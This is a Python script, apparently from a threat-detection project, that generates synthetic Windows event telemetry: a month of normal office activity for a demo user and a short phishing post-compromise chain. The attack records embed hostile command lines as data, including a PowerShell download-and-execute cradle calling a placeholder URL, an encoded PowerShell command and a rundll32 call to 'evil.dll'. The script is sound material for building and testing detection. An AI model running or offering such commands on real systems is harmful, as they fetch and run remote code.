"""Generate a small, clearly-labeled demo dataset so the platform is runnable
out of the box without downloading anything.

NOTE: this is SYNTHETIC data for a smoke-test / demo baseline only. Real
detection metrics in the README come from EVTX-ATTACK-SAMPLES (real attack
telemetry) — see scripts/metrics.py. Never put synthetic numbers on a resume.
"""
from __future__ import annotations

import json
import os
import random
from datetime import datetime, timedelta, timezone

OUT = os.path.join(os.path.dirname(__file__), "..", "data", "samples")
USER = "ACME\\jdoe"
HOST = "WS-07"

OFFICE = ["winword.exe", "excel.exe", "outlook.exe", "chrome.exe", "teams.exe"]
INTERNAL_IPS = ["10.0.0.5", "10.0.0.8", "10.0.1.20", "10.0.2.15"]


def _rec(ts, etype, **kw):
    rec = {"timestamp": ts.isoformat(), "host": HOST, "user": USER, "event": {"category": [etype]}}
    rec.update(kw)
    return rec


def normal_telemetry(days: int = 30) -> list[dict]:
    """jdoe: logs in 9-18h on weekdays, runs office apps, talks to internal IPs."""
    out = []
    start = datetime.now(timezone.utc) - timedelta(days=days)
    for d in range(days):
        day = start + timedelta(days=d)
        if day.weekday() >= 5:        # skip weekends
            continue
        login = day.replace(hour=random.randint(8, 10), minute=random.randint(0, 59))
        out.append(_rec(login, "authentication", LogonType="3", IpAddress="10.0.0.9"))
        for _ in range(random.randint(15, 30)):
            t = day.replace(hour=random.randint(9, 18), minute=random.randint(0, 59))
            proc = random.choice(OFFICE)
            out.append(_rec(t, "process", **{
                "process": {"name": proc, "parent": {"name": "explorer.exe"},
                            "command_line": f"{proc}"}}))
            if proc == "chrome.exe":
                out.append(_rec(t, "network", **{
                    "destination": {"ip": random.choice(INTERNAL_IPS), "port": 443},
                    "process": {"name": "chrome.exe"}}))
    return out


def attack_scenario() -> list[dict]:
    """The phishing -> post-compromise chain at 02:14 (the 'jdoe' scenario)."""
    t = datetime.now(timezone.utc).replace(hour=2, minute=14, second=1)
    return [
        _rec(t, "authentication", LogonType="10", IpAddress="185.220.101.5"),
        _rec(t + timedelta(seconds=20), "process", **{"process": {
            "name": "powershell.exe", "parent": {"name": "winword.exe"},
            "command_line": "powershell -enc ZQB2AGkAbAA="}}),
        _rec(t + timedelta(seconds=25), "process", **{"process": {
            "name": "powershell.exe", "parent": {"name": "winword.exe"},
            "command_line": "powershell IEX(New-Object Net.WebClient).DownloadString('http://x')"}}),
        _rec(t + timedelta(seconds=40), "network", **{
            "destination": {"ip": "185.220.101.5", "port": 443},
            "process": {"name": "powershell.exe"}}),
        _rec(t + timedelta(seconds=90), "process", **{"process": {
            "name": "rundll32.exe", "parent": {"name": "powershell.exe"},
            "command_line": "rundll32 evil.dll,Start"}}),
    ]


def main():
    os.makedirs(os.path.join(OUT, "normal"), exist_ok=True)
    os.makedirs(os.path.join(OUT, "attack"), exist_ok=True)
    with open(os.path.join(OUT, "normal", "baseline_normal.json"), "w") as fh:
        json.dump(normal_telemetry(), fh, indent=2)
    with open(os.path.join(OUT, "attack", "phishing_scenario.json"), "w") as fh:
        json.dump(attack_scenario(), fh, indent=2)
    print("Wrote demo data to", os.path.abspath(OUT))


if __name__ == "__main__":
    main()
